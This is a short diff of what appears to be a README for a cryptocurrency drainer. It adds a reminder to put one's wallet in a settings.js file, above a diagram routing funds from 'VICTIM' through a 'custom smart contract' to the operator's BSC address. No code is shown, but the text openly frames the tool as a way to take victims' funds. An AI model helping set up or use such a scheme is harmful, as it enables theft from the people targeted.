@@ -1,4 +1,6 @@
 
+!!!!!! Make sure you add your wallet to settings.js file !!!!!!!
+
 HOW IT WORKS
 
 VICTIM ----> CUSTOM SMART CONTRACT -----> YOUR BSC ADDRESS
